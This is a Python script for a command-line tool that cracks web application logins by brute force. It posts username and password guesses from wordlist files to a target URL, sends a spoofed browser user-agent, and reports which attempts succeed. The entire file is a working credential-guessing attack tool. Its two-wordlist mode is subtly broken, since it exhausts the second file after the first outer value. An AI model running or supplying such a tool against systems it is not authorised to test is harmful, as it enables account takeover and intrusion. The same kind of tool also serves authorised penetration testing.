import argparse,requests,sys
payload1='nothing'
payload2='nothing'
count=0
fail_count=0
success_count=0
print(' __      __                               ')
print('/  \\    /  \\_____    ___________    ____  ')
print('\\   \\/\\/   /\\__  \\  /  ___/\\__  \\ _/ ___\\ ')
print(' \\        /  / __ \\_\\___ \\  / __ \\\\  \\___ ')
print('  \\__/\\  /  (____  /____  >(____  /\\___  >')
print('       \\/        \\/     \\/      \\/     \\/ ')
print('Web Application Service Authentication Cracker v0.1.0')
print('Copyright (c) Gr3yPh 2024')
parser = argparse.ArgumentParser(description='A tool which is able to crack web applications\' service authentication')
parser.add_argument('-t','--target',type=str,help='Target URL')
parser.add_argument('--payload-count',type=int,help='Payload count (1 or 2)',default=1)
parser.add_argument('-p1','--payload1',type=str,help='The path of the first payload\'s dictionary')
parser.add_argument('-p2','--payload2',type=str,help='The path of the second payload\'s dictionary')
parser.add_argument('-f','--format',type=str,help='POST Format (replace payload position with ^P1^ and ^P2^)')
parser.add_argument('-F','--First',action='store_true',help='Stop cracking as soon as the first valid payload is found')
parser.add_argument('--grep-match',type=str,help='Flag items which contains grep-match value (The program will recognize this payload as failure if response contains this grep-match key word)',default='failed')
args=parser.parse_args()

if args.target and args.payload_count:
    if args.payload_count == 1:
        if args.payload1:
            if '^P1^' in args.format:
                print('[*]Starting attack...')
                try:
                    f=open(args.payload1,'r')
                except:
                    print('[-]Have trouble opening dictionary file, Please check if the file is valid.')
                    sys.exit(1)
                    print('\n','*'*25,'\n')
                for payload1 in f:
                    count+=1
                    payload1=payload1.replace('\n', '').replace('\r', '')
                    data = args.format.replace('^P1^',payload1)
                    try:
                        print(data)
                        response=requests.post(args.target,headers={'user-agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362'},data=data,timeout=10)
                    except:
                        print('Error connecting to the target. Check the Internet connections and try again.')
                        sys.exit(1)
                    if args.grep_match.encode() in response.content:
                        print('Payload: ',payload1,' Response length:',len(response.text),'  Failed')
                        fail_count+=1
                    else:
                        print('Payload: ',payload1,' Response length:',len(response.text),'  Success')
                        success_count+=1
                        if args.First:
                            break
                        
            else:
                print('[-]Missing POST format or format is invalid. QUIT!')
                sys.exit(1)
        else:
            print('[-]Missing payload. QUIT!')
            sys.exit(1)
    elif args.payload_count == 2:
        if args.payload1 and args.payload2:
            if '^P2^' in args.format and '^P1^' in args.format:
                print('[*]Starting attack...')
                f1=open(args.payload1,'r')
                f2=open(args.payload2,'r')
                print('\n','*'*25,'\n')
                for payload1 in f1:
                    for payload2 in f2:
                        count+=1
                        payload1=payload1.replace('\n', '').replace('\r', '')
                        payload2=payload2.replace('\n', '').replace('\r', '')
                        #data=eval(args.format)
                        data = args.format.replace('^P1^',payload1).replace('^P2^',payload2)
                        try:
                            response=requests.post(args.target,headers={'content-type':'application/json','user-agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362'},data=data)
                        except:
                            print('[-]Error connecting to the target. Check the Internet connections and try again.')
                            
                            sys.exit(1)
                        if args.grep_match.encode() in response.content:
                            print('Payload: ',payload1,' and ',payload2,' Response length:',len(response.text),'  Failed')
                            fail_count+=1
                        else:
                            print('Payload: ',payload1,' and ',payload2,' Response length:',len(response.text),' Success')
                            success_count+=1
                            if args.First:
                                break
            else:
                print('[-]Incorrect POST format. QUIT!')
                sys.exit(1)
        else:
            print('[-]Missing payload1 or payload2. QUIT!')
            sys.exit(1)
    else:
        print('[-]Payload count must be 1 or 2. QUIT!')
        sys.exit(1)
else:
    print('[-]Missing target URL or payload count. QUIT!')
    sys.exit(1)

print('\n','*'*25,'\n')
print('[+]Finished.')
print('[*]Total ',str(count))
print('[*]Success count ',str(success_count))
print('[*]Failure count ',str(fail_count))